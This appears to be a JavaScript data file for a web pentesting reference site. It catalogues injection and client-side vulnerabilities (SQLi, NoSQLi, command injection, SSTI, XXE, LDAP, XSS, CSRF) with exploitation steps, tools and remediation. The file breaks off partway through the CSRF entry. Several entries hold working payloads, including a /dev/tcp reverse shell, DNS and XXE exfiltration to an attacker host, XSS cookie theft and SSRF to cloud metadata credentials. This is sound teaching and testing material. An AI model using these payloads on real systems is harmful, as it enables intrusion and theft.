/*
  VULNS -- the data behind /vulns.html and /vuln-detail.html.

  A categorized field reference of common vulnerabilities and
  misconfigurations. Same shape as toolkit.js so the same rendering,
  search, and detail-page machinery works.

  {
    id:          "unique-slug",   // powers vuln-detail.html?vuln=<id>
    name:        "Vulnerability Name",
    severity:    "Critical|High|Medium|Low|Info",
    ref:         "https://...",   // optional external reference (button)
    theory:      "theory/....html",// optional link to a deep theory page (button)
    description: "One line for the grid card.",
    brief:       "Overview paragraph(s). Use \n\n between paragraphs.",
    quickReference: [ { label: "...", cmd: "payload or indicator" } ],
    sections: [ {title,type:"table",columns,rows} | {type:"commands",commands} | {type:"notes",items} ]
  }

  HOW TO ADD: drop a new object into the right category's `vulns` array,
  or add a new { category, vulns:[...] } block. Save and refresh.
*/

var VULNS = [
    {
    category: "Injection",
    vulns: [
      {
        id: "sqli",
        name: "SQL Injection (SQLi)",
        severity: "Critical",
        ref: "https://portswigger.net/web-security/sql-injection",
        description: "User input reaches a SQL query unsanitized, letting an attacker read, modify, or destroy database data — and sometimes reach the OS.",
        brief: "SQL injection happens when user-controlled input is concatenated into a SQL query instead of being bound as a parameter. The database cannot tell the attacker's data from the developer's code, so a crafted value changes the query's meaning.\n\nImpact: dump other users' rows, bypass authentication, and — with enough database privilege — read/write files and execute commands on the database host. It remains one of the most serious and common web vulnerabilities.",
        quickReference: [
          { label: "Break the query (probe)", cmd: "'   ' OR '1'='1   ' OR 1=1-- -   \" OR \"\"=\"" },
          { label: "UNION column count", cmd: "' ORDER BY 5-- -   then  ' UNION SELECT NULL,NULL,NULL-- -" },
          { label: "Time-based blind confirm", cmd: "' AND SLEEP(5)-- -   (MySQL)   '; WAITFOR DELAY '0:0:5'-- (MSSQL)" },
          { label: "Automate", cmd: "sqlmap -r request.txt --batch --dbs" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Detect — break the query and watch the response", cmd: "# a single quote causes a 500 / SQL error / different response\nid=1'\n# boolean pair differs -> injectable:\nid=1' AND '1'='1   (normal)   vs   id=1' AND '1'='2   (empty)" },
              { label: "2. Determine the injection type", cmd: "# error-based: the DB echoes an error containing data\n# UNION: results returned in the page -> extract directly\nid=1' ORDER BY 6-- -            # find column count (errors at N+1)\nid=-1' UNION SELECT 1,version(),database(),4,5,6-- -" },
              { label: "3. Blind (no output) — infer with boolean or time", cmd: "# boolean: ask true/false questions\nid=1' AND SUBSTRING(version(),1,1)='8'-- -\n# time-based when nothing is reflected:\nid=1' AND IF(1=1,SLEEP(5),0)-- -" },
              { label: "4. Automate the extraction with sqlmap", cmd: "# capture the request in Burp -> request.txt, then:\nsqlmap -r request.txt --batch --dbs\nsqlmap -r request.txt -D appdb --tables\nsqlmap -r request.txt -D appdb -T users --dump" },
              { label: "5. Escalate beyond data (high privilege only, in scope)", cmd: "sqlmap -r request.txt --is-dba --privileges\n# MSSQL: --os-shell (xp_cmdshell)   MySQL: --file-read/--file-write (webshell)\n# stop at a proof unless full exploitation is authorised" }
            ]
          },
          {
            title: "Injection Types",
            type: "table",
            columns: ["Type", "Detail"],
            rows: [
              ["In-band (UNION/error)", "Results or errors returned directly in the response"],
              ["Boolean blind", "A true/false condition changes the response subtly"],
              ["Time blind", "Infer true/false from a deliberate SLEEP/WAITFOR delay"],
              ["Stacked queries", "A second statement after ; enables writes and sometimes RCE"],
              ["Second-order", "Input is stored, then used unsafely in a later query"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find an injectable parameter", "Confirmed SQLi point"],
              ["2", "Identify type + DBMS + columns", "A working extraction technique"],
              ["3", "Dump data (users, hashes, PII)", "Sensitive data / auth bypass"],
              ["4", "Read/write files, xp_cmdshell (if DBA)", "RCE on the DB host"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["sqlmap", "Automated detection, extraction, and OS/file takeover"],
              ["Burp Suite", "Manual probing, capturing the request, Intruder"],
              ["ghauri / NoSQLMap", "Alternative injection automation"],
              ["hashcat", "Crack dumped password hashes"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — SQL injection", url: "https://portswigger.net/web-security/sql-injection" },
              { label: "OWASP — SQL Injection Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" },
              { label: "PayloadsAllTheThings — SQLi", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Use parameterised queries / prepared statements everywhere — the one fix that works. Never build SQL by string concatenation.",
              "Use an ORM correctly and beware raw-query escape hatches that reintroduce the bug.",
              "Apply least privilege to the DB account (no FILE, no xp_cmdshell, no DBA) so a bug is not automatically RCE.",
              "Allow-list where structure is dynamic (ORDER BY column names) since parameters cannot bind identifiers.",
              "Treat input validation and a WAF as defense-in-depth, not a substitute for parameterisation."
            ]
          }
        ]
      },
      {
        id: "nosqli",
        name: "NoSQL Injection",
        severity: "High",
        ref: "https://portswigger.net/web-security/nosql-injection",
        description: "Operator or JavaScript injection into a NoSQL query (typically MongoDB), enabling authentication bypass and data extraction.",
        brief: "NoSQL databases are still injectable. When user input is placed into a query object without sanitising query operators, an attacker smuggles in operators like $ne, $gt, or $regex to change the query's logic — most famously turning a login check into one that is always true.\n\nImpact: authentication bypass in a single request, blind extraction of secrets character by character, and — via $where / mapReduce — server-side code execution. It is common because developers assume NoSQL is immune to injection.",
        quickReference: [
          { label: "Auth bypass (JSON body)", cmd: "{\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}" },
          { label: "Auth bypass (form / URL)", cmd: "user[$ne]=x&pass[$ne]=x" },
          { label: "Blind extraction", cmd: "pass[$regex]=^a   pass[$regex]=^b  ... (walk each char)" },
          { label: "Automate", cmd: "nosqli scan -t 'https://target/search?q=test'" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Authentication bypass — send an operator instead of a value", cmd: "# in Burp, change the login body from a string to an operator object:\n#   {\"user\":\"admin\",\"pass\":\"x\"}   ->   {\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}\n# 'password not equal to x' is true for any real password -> logged in" },
              { label: "2. Form/URL variant (bracket notation parses to an object)", cmd: "# Express/PHP turn param[$ne]=x into { param: { $ne: 'x' } }\ncurl 'https://target/login' -d 'user[$ne]=x&pass[$ne]=x'" },
              { label: "3. Blind data extraction with $regex", cmd: "# response differs when the pattern matches -> extract a secret char by char\npass[$regex]=^a   # false\npass[$regex]=^s   # true -> first char is 's', continue ^se, ^sec ...\n# automate the walk with a script or nosqli" },
              { label: "4. Server-side JavaScript via $where", cmd: "# where the app builds a $where/mapReduce from input:\n{\"$where\": \"this.pass == this.pass\"}   # always true\n# these can reach code execution on the DB" },
              { label: "5. Automate detection", cmd: "nosqli scan -t 'https://target/search?q=test'\nnosqli scan -t https://target/login -r POST -d '{\"user\":\"a\",\"pass\":\"b\"}'" }
            ]
          },
          {
            title: "Operators Abused",
            type: "table",
            columns: ["Operator", "Effect"],
            rows: [
              ["$ne / $gt / $lt", "Always-true comparisons → auth bypass"],
              ["$regex", "Pattern match → blind character-by-character extraction"],
              ["$where", "Server-side JavaScript → path to code execution"],
              ["$in / $exists", "Match any of a list / test field presence"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Send an operator where a value is expected", "Confirm injection / auth bypass"],
              ["2", "Use $regex to extract secrets", "Passwords / tokens recovered"],
              ["3", "Reach $where / mapReduce if present", "Server-side code execution"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["nosqli", "Maintained NoSQL injection scanner (MongoDB)"],
              ["Burp Suite", "Manual operator injection and testing"],
              ["custom scripts", "Automate $regex blind extraction"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — NoSQL injection", url: "https://portswigger.net/web-security/nosql-injection" },
              { label: "PayloadsAllTheThings — NoSQL Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Validate input types strictly — reject objects/arrays where a scalar (string) is expected.",
              "Cast user input to the expected type before it reaches the query; a password must never be allowed to be an object.",
              "Disable server-side JavaScript ($where, mapReduce) unless genuinely required.",
              "Use the driver's query builders instead of passing raw user-controlled objects into queries.",
              "Never expose an unauthenticated MongoDB to the network."
            ]
          }
        ]
      },
      {
        id: "command-injection",
        name: "OS Command Injection",
        severity: "Critical",
        ref: "https://portswigger.net/web-security/os-command-injection",
        description: "User input reaches a system shell command, letting an attacker run arbitrary commands on the server.",
        brief: "Command injection occurs when an application builds an OS command from unsanitised input and passes it to a shell. Shell metacharacters (;, |, &, `, $()) let the attacker append or substitute their own commands, which run with the web process's privileges.\n\nImpact: direct code execution on the host — read secrets, pivot internally, and take full control. It appears wherever an app shells out: ping/traceroute tools, file/PDF/image converters, backup and export features.",
        quickReference: [
          { label: "Command separators", cmd: "; id    | id    & id    && id    %0a id" },
          { label: "Inline substitution", cmd: "$(id)    `id`" },
          { label: "Blind out-of-band confirm", cmd: "; nslookup $(whoami).attacker.oastify.com" },
          { label: "Blind time-based", cmd: "; ping -c 5 127.0.0.1   ; sleep 5" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Suspect any feature that shells out", cmd: "# ping/nslookup/whois tools, file converters, pdf/image processing, zip/tar,\n# git operations, 'run diagnostics' buttons -> prime candidates\nhost=127.0.0.1; id   # append a command to a ping parameter" },
              { label: "2. Results-based — see command output in the response", cmd: "host=127.0.0.1; id\nhost=127.0.0.1 | whoami\nhost=127.0.0.1 && cat /etc/passwd" },
              { label: "3. Blind time-based — no output, infer from delay", cmd: "host=127.0.0.1; sleep 5     # response delayed 5s = injectable\nhost=127.0.0.1; ping -c 5 127.0.0.1" },
              { label: "4. Blind out-of-band — trigger a callback", cmd: "host=127.0.0.1; nslookup $(whoami).oob.attacker.com\n# a DNS/HTTP hit on your Collaborator/OAST host confirms + exfils output" },
              { label: "5. Automate + escalate to a shell", cmd: "commix -u 'https://target/tools/ping?host=127.0.0.1' --level 2\n# then a reverse shell (in scope): ; bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'" }
            ]
          },
          {
            title: "Injection Contexts",
            type: "table",
            columns: ["Context", "Break-out"],
            rows: [
              ["Unquoted argument", "Any separator: ; | & && ||"],
              ["Inside double quotes", "$(cmd) / `cmd` still execute"],
              ["Inside single quotes", "Close the quote first: ' then the payload"],
              ["Newline-sensitive parsers", "%0a injects a new command line"],
              ["Argument injection", "Extra flags (e.g. -o) change behaviour without a separator"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a shell-adjacent feature", "Candidate injection point"],
              ["2", "Confirm (output / delay / OOB)", "Verified command execution"],
              ["3", "Run a reverse shell", "Interactive access as the web user"],
              ["4", "Escalate / pivot internally", "Host and network compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Commix", "Automated command-injection detection and exploitation"],
              ["Burp Suite (Collaborator)", "Manual testing and blind OOB detection"],
              ["Interactsh / OAST", "Out-of-band confirmation for blind cases"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — OS command injection", url: "https://portswigger.net/web-security/os-command-injection" },
              { label: "PayloadsAllTheThings — Command Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Avoid calling the shell — use language APIs (e.g. a DNS library instead of nslookup).",
              "If you must run a binary, use an exec form that passes arguments as an array, never a single shell string.",
              "Never pass user input into the command; where a value is required, validate against a strict allow-list.",
              "Run the web process with least privilege to contain a foothold.",
              "Fix the code — a WAF blocking obvious payloads is trivially bypassed."
            ]
          }
        ]
      },
      {
        id: "ssti",
        name: "Server-Side Template Injection (SSTI)",
        severity: "Critical",
        ref: "https://portswigger.net/web-security/server-side-template-injection",
        description: "User input is evaluated by a server-side template engine, often escalating to remote code execution.",
        brief: "SSTI happens when user input is embedded into a template rendered server-side, so it is interpreted as template code rather than data. Because template engines are small interpreters, this usually escalates from information disclosure to full command execution via documented sandbox escapes.\n\nImpact: RCE on the server. It is increasingly common as apps build emails, pages, and documents from templates with user-controlled fields. The tell is that a math expression in the template syntax gets evaluated.",
        quickReference: [
          { label: "Detection probes", cmd: "{{7*7}}  ${7*7}  <%= 7*7 %>  #{7*7}  {7*7}  -> look for 49" },
          { label: "Distinguish Jinja2 vs Twig", cmd: "{{7*'7'}}  -> 7777777 (Jinja2) or 49 (Twig)" },
          { label: "Jinja2 RCE (concept)", cmd: "{{ cycler.__init__.__globals__.os.popen('id').read() }}" },
          { label: "Automate", cmd: "python3 sstimap.py -u 'https://target/page?name=x' --os-shell" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Detect — inject a math probe in each reflected field", cmd: "# names, subjects, profile fields, error messages\nname={{7*7}}     # rendered 49 = server-side evaluation (not XSS)\nname=${7*7}      # dollar-brace engines\nname=<%= 7*7 %>  # ERB" },
              { label: "2. Fingerprint the engine", cmd: "{{7*'7'}}  ->  7777777 means Jinja2 (Python), 49 means Twig (PHP)\n# match the rendered result to the engine, then use that engine's escape" },
              { label: "3. Jinja2 escape to RCE (sandbox breakout)", cmd: "{{ ''.__class__.__mro__[1].__subclasses__() }}   # enumerate classes\n{{ cycler.__init__.__globals__.os.popen('id').read() }}   # execute" },
              { label: "4. Other engines' exec paths", cmd: "# Twig:      {{['id']|filter('system')}}\n# Freemarker:${'freemarker.template.utility.Execute'?new()('id')}\n# Velocity/Smarty have documented exec gadgets too" },
              { label: "5. Automate + get a shell", cmd: "python3 sstimap.py -u 'https://target/greet?name=x' --os-cmd id\npython3 sstimap.py -u 'https://target/greet?name=x' --os-shell" }
            ]
          },
          {
            title: "Engine Fingerprint",
            type: "table",
            columns: ["Rendered probe", "Likely engine"],
            rows: [
              ["{{7*7}} → 49", "Jinja2 (Python), Twig (PHP)"],
              ["${7*7} → 49", "Freemarker, Velocity (Java)"],
              ["<%= 7*7 %> → 49", "ERB (Ruby)"],
              ["{7*7} → 49", "Smarty (PHP)"],
              ["{{7*'7'}} → 7777777", "Jinja2 (repeats) vs Twig (49)"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Reflect a math probe", "Confirm server-side evaluation"],
              ["2", "Fingerprint the engine", "The correct escape chain"],
              ["3", "Escape the sandbox to language internals", "Access to os/Runtime"],
              ["4", "Execute OS commands", "RCE on the server"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["SSTImap", "Detect and exploit SSTI to RCE across engines"],
              ["Burp Suite", "Manual probing and reflection analysis"],
              ["tplmap (legacy)", "Older automation; SSTImap is the maintained successor"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Server-side template injection", url: "https://portswigger.net/web-security/server-side-template-injection" },
              { label: "PayloadsAllTheThings — SSTI", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Never pass user input into the template string; pass it as rendering data/context, which the engine treats as inert.",
              "Use a logic-less or sandboxed engine and keep the sandbox enabled and updated.",
              "Validate and allow-list any input that must influence template selection.",
              "Treat confirmed SSTI as potential RCE; stop exploitation at a benign proof (id) unless in scope."
            ]
          }
        ]
      },
      {
        id: "xxe",
        name: "XML External Entity (XXE)",
        severity: "High",
        ref: "https://portswigger.net/web-security/xxe",
        description: "An XML parser processes attacker-defined external entities, enabling file read, SSRF, and sometimes RCE.",
        brief: "XXE arises when an application parses XML that permits external entity definitions and does not disable them. An attacker defines an entity pointing at a local file or internal URL; when the parser expands it, the contents are pulled into the response or sent to a server the attacker controls.\n\nImpact: local file disclosure (source, config, keys), SSRF to internal services and cloud metadata, denial of service, and occasionally RCE. Any XML input is a candidate — SOAP, SAML, and document uploads (DOCX/SVG/XLSX).",
        quickReference: [
          { label: "Classic file read", cmd: "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>" },
          { label: "SSRF via entity", cmd: "<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">" },
          { label: "Blind OOB (external DTD)", cmd: "<!ENTITY % x SYSTEM \"http://attacker/evil.dtd\">" },
          { label: "Where to inject", cmd: "Any XML body, SVG/DOCX/XLSX upload, SAML, SOAP" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. In-band file read", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><data>&xxe;</data></root>\n# the file contents appear where &xxe; is reflected" },
              { label: "2. SSRF — reach internal services / cloud metadata", cmd: "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]>\n<root>&xxe;</root>   # returns IAM creds in AWS" },
              { label: "3. Blind (no reflection) — exfil via an external DTD", cmd: "# host evil.dtd on your server:\n#   <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n#   <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>\">\n#   %eval; %exfil;\n# payload:\n<!DOCTYPE r [<!ENTITY % x SYSTEM \"http://attacker/evil.dtd\"> %x;]>" },
              { label: "4. File uploads that are XML underneath", cmd: "# SVG, DOCX, XLSX are XML -> embed the DOCTYPE/entity in the file's XML and upload\n# e.g. a malicious .svg processed server-side leaks files" },
              { label: "5. Confirm blind with an OOB callback", cmd: "<!DOCTYPE r [<!ENTITY x SYSTEM \"http://YOUR-COLLAB.oastify.com\">]><r>&x;</r>\n# a hit proves the parser fetches external entities" }
            ]
          },
          {
            title: "Variants",
            type: "table",
            columns: ["Variant", "Detail"],
            rows: [
              ["In-band read", "Entity contents appear in the response"],
              ["Blind OOB", "Exfiltrate via an external DTD to your server"],
              ["Error-based", "Provoke a parser error embedding the file contents"],
              ["SSRF", "Point the entity at internal services / metadata"],
              ["Billion Laughs (DoS)", "Nested entities expand exponentially"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find XML input (body/upload/SAML)", "Candidate parser"],
              ["2", "Inject a benign entity / OOB probe", "Confirm external-entity processing"],
              ["3", "Read files or reach internal URLs", "Secret disclosure / SSRF"],
              ["4", "Chain SSRF to cloud metadata", "Credential theft → wider compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (+ Collaborator)", "Manual injection and blind OOB detection"],
              ["XXEinjector", "Automated file retrieval via XXE"],
              ["oxml_xxe / docem", "Embed XXE into Office/SVG documents"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — XXE injection", url: "https://portswigger.net/web-security/xxe" },
              { label: "OWASP — XXE Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Disable external entity and DTD processing in the XML parser — the definitive fix, usually one flag.",
              "Prefer JSON where XML is not required; patch and harden the XML library (defaults vary).",
              "Validate/sanitise uploaded XML-based files (SVG, Office documents) before parsing.",
              "Apply least privilege and egress controls so a successful XXE reads little and reaches nothing internal."
            ]
          }
        ]
      },
      {
        id: "ldap-injection",
        name: "LDAP Injection",
        severity: "High",
        ref: "https://owasp.org/www-community/attacks/LDAP_Injection",
        description: "Unsanitised input in an LDAP filter alters directory queries, enabling authentication bypass and information disclosure.",
        brief: "LDAP injection is the directory-service cousin of SQLi. When an application builds an LDAP search filter from user input without escaping the special filter characters, an attacker rewrites the filter.\n\nImpact: bypass authentication, enumerate directory objects, and extract attributes character by character. It appears wherever an app authenticates or searches against a directory (SSO, address books, user lookups) using string-built filters.",
        quickReference: [
          { label: "Auth bypass (always-true)", cmd: "*)(uid=*))(|(uid=*     or simply   *" },
          { label: "Wildcard enumeration", cmd: "admin*   a*   (walk the alphabet)" },
          { label: "Blind attribute extraction", cmd: "*)(mail=a*)   vary the pattern, watch the response" },
          { label: "Special chars", cmd: "( ) * \\ NUL /" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Probe with a wildcard / filter break", cmd: "# a login/search form that builds (&(uid=INPUT)(password=INPUT))\nuser=*            # returns everyone / logs in?\nuser=*)(uid=*     # filter break -> LDAP error or changed results = injectable" },
              { label: "2. Authentication bypass — force an always-true filter", cmd: "# inject to make the bind/search match unconditionally\nuser=admin)(&))     # closes the clause, injects an always-true condition\nuser=*)(uid=*))(|(uid=*" },
              { label: "3. Blind extraction with wildcards", cmd: "# vary a wildcard pattern and watch which requests succeed\nuser=admin)(mail=a*)   # true if a mail attribute starts with 'a'\n# walk the alphabet per position to reconstruct values" },
              { label: "4. Enumerate objects / privileged groups", cmd: "# where results are reflected, inject filters to list users, groups, admins\n*)(objectClass=*)   # broadens the match to enumerate the directory" }
            ]
          },
          {
            title: "How the Filter Breaks",
            type: "table",
            columns: ["Input", "Effect"],
            rows: [
              ["*", "Wildcard — matches any value"],
              [")(  and  (|", "Close the current clause and inject a new OR condition"],
              ["*)(uid=*))(|(uid=*", "A classic break making the search always match"],
              ["No escaping", "Input goes straight into (&(uid=INPUT)(password=INPUT))"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a directory-backed form", "Candidate LDAP filter"],
              ["2", "Break the filter / inject a wildcard", "Confirm injection"],
              ["3", "Force an always-true filter", "Authentication bypass"],
              ["4", "Blind-extract attributes", "User/credential disclosure"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite", "Manual filter-break testing and blind extraction"],
              ["ldapsearch", "Validate directory behaviour and craft filters"],
              ["custom scripts", "Automate wildcard-based blind extraction"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "OWASP — LDAP Injection", url: "https://owasp.org/www-community/attacks/LDAP_Injection" },
              { label: "PayloadsAllTheThings — LDAP Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Escape all LDAP special characters using the framework's LDAP encoding routine before building a filter.",
              "Use parameterised LDAP APIs / safe filter builders rather than string concatenation.",
              "Bind with least privilege and never build the bind DN or filter from raw input.",
              "Authenticate with a proper bind operation, not by searching with a user-supplied password in the filter.",
              "Validate input against an allow-list where the format is known."
            ]
          }
        ]
      }
    ]
  },
    {
    category: "Cross-Site & Client-Side",
    vulns: [
      {
        id: "xss",
        name: "Cross-Site Scripting (XSS)",
        severity: "High",
        ref: "https://portswigger.net/web-security/cross-site-scripting",
        description: "Attacker-controlled script executes in another user's browser, stealing sessions and acting as the victim.",
        brief: "XSS occurs when an application includes untrusted data in a page without correct encoding, so the browser executes it as script. The attacker's JavaScript then runs in the victim's session — reading cookies and tokens, making authenticated requests, keylogging, or rewriting the page.\n\nImpact: session hijacking, account takeover, credential theft, and full control of the victim's interaction with the site. It is the most widespread web vulnerability class; the fix everywhere is the same principle — encode on output, in the correct context.",
        quickReference: [
          { label: "Reflected probe", cmd: "<script>alert(document.domain)</script>" },
          { label: "Attribute / tag break-out", cmd: "\"><img src=x onerror=alert(1)>     '-alert(1)-'" },
          { label: "No-script vectors", cmd: "<svg onload=alert(1)>   <img src=x onerror=alert(1)>   <body onpageshow=alert(1)>" },
          { label: "Session theft (concept)", cmd: "<script>fetch('//attacker/?c='+document.cookie)</script>" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Inject a unique marker and find the reflection", cmd: "# reflect a harmless string and locate where/how it appears\nq=xss7411test\n# search the response and DOM: is it in HTML body, an attribute, a <script>, or written by JS?" },
              { label: "2. Identify the context — it dictates the payload", cmd: "# HTML body     -> inject a tag:        <svg onload=alert(1)>\n# HTML attribute -> close it first:      \"><svg onload=alert(1)>\n# inside <script>-> break the string:    ';alert(1)//\n# href / URL     -> scheme:              javascript:alert(1)" },
              { label: "3. Adapt to filters", cmd: "# test which of  < > \" ' / ( )  are blocked or encoded, then bypass:\n<sVg OnLoad=alert(1)>              # case / tag variation\n<img src=x onerror=alert`1`>       # no parentheses (backticks)\n<svg onload=alert(1) //           # break malformed sanitisers" },
              { label: "4. DOM XSS — trace source to sink", cmd: "# user-controlled source flows into a dangerous sink client-side\nlocation.hash / location.search  ->  innerHTML / document.write / eval\n# example sink:  el.innerHTML = location.hash.slice(1)\n# payload:  #<img src=x onerror=alert(1)>   (often never reaches the server)" },
              { label: "5. Weaponise — steal the session / act as the victim", cmd: "# exfiltrate the cookie (if not HttpOnly):\n<script>new Image().src='//attacker/?c='+document.cookie</script>\n# or ride the session directly with a same-origin request:\n<script>fetch('/account/email',{method:'POST',body:'email=attacker@evil',credentials:'include'})</script>\n# blind/stored XSS: plant a callback payload where an admin will view it (XSS Hunter)" }
            ]
          },
          {
            title: "Types",
            type: "table",
            columns: ["Type", "Where it lives"],
            rows: [
              ["Reflected", "Payload is in the request and echoed straight back — delivered via a crafted link"],
              ["Stored", "Payload is saved (comment, profile, message) and fires for every viewer — the most dangerous"],
              ["DOM-based", "Client-side JS writes attacker input into a dangerous sink; the server may never see it"],
              ["Blind", "Stored XSS that fires somewhere you cannot see (admin panel, logs) — catch with an OOB callback"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Reflect a marker, find where it lands", "Injection point + context"],
              ["2", "Craft a context-appropriate payload", "Script executes in the browser"],
              ["3", "Deliver to the victim (link or stored)", "Runs in the victim's session"],
              ["4", "Steal cookies / make authenticated requests", "Session hijack / account takeover"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (+ DOM Invader)", "Manual probing, context analysis, DOM-XSS discovery"],
              ["dalfox", "Automated XSS scanning and parameter analysis"],
              ["XSS Hunter / Interactsh", "Blind XSS callbacks and out-of-band confirmation"],
              ["DOMPurify (defence)", "Reference sanitiser for safe rich HTML"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Cross-site scripting", url: "https://portswigger.net/web-security/cross-site-scripting" },
              { label: "OWASP — XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
              { label: "PayloadsAllTheThings — XSS Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Context-aware output encoding is the core fix — HTML-encode in HTML, JS-encode in scripts, URL-encode in URLs. Use the framework's auto-escaping and do not disable it.",
              "Avoid dangerous DOM sinks (innerHTML, document.write, eval); use textContent and safe APIs, or a sanitiser like DOMPurify for rich HTML.",
              "Deploy a strong Content-Security-Policy as defense-in-depth — it limits impact when encoding is missed.",
              "Set HttpOnly on session cookies so script cannot read them, and SameSite to blunt cross-site delivery.",
              "Validate input on the way in, but never rely on input filtering alone — encoding on output is what prevents XSS."
            ]
          }
        ]
      },
      {
        id: "csrf",
        name: "Cross-Site Request Forgery (CSRF)",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/csrf",
        description: "A malicious site causes the victim's browser to send an authenticated state-changing request they never intended.",
        brief: "CSRF abuses the browser's habit of attaching cookies to every request to a site, regardless of who initiated it. If a state-changing action relies only on the session cookie for authorization, an attacker can host a page that silently submits that request from the victim's authenticated browser — changing their email, password, or settings.\n\nImpact: account takeover and unwanted state changes performed as the victim. It requires no XSS and no credential theft; it simply rides the victim's existing session. The defence is an unpredictable, per-request token a cross-site attacker cannot know.",
        quickReference: [
          { label: "Auto-submitting form (concept)", cmd: "<form action=//target/change-email method=POST>\n <input name=email value=attacker@evil>\n</form><script>document.forms[0].submit()</script>" },
          { label: "Test: remove the token", cmd: "Strip the CSRF token/param — if the action still succeeds, it's vulnerable" },
          { label: "Test: swap the token", cmd: "Use another user's/session's token — if accepted, it isn't bound to the session" },
          { label: "Check", cmd: "Is the action protected only by a cookie? Is SameSite set? Is the token validated?" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Find a state-changing request with weak protection", cmd: "# capture a sensitive action (change email/password, transfer, role change)\nPOST /account/change-email  email=user@corp\n# is it authorised by the session cookie alone, with no unguessable token?" },
              { label: "2. Test whether the anti-CSRF control actually holds", cmd: "# remove the token entirely           -> still works?  vulnerable\n# use a token from another session     -> accepted?     not session-bound\n# change POST to GET                    -> honoured?     method not enforced\n# empty the token value                -> accepted?     validated only for presence" },
